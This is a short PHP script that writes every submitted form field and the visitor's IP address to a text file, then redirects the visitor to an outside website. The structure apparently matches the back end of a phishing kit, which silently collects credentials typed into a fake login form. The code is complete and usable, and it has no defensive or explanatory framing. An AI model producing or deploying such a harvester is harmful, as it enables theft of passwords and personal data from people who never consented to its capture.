<?php
 // writing Ip address to the same file
$handle = fopen('users.txt', 'a');

foreach($_POST as $variable => $value) {
    fwrite($handle, $variable . '=' . $value . PHP_EOL);
}

fwrite($handle, 'REMOTE IP ADDRESS: ' . $_SERVER['REMOTE_ADDR'] . PHP_EOL); // Grabbing the REMOTE IP ADDRESS
fclose($handle);

/* Redirectng to a different page --> */
header('Location: http://jaysonzabate.com/');
exit;




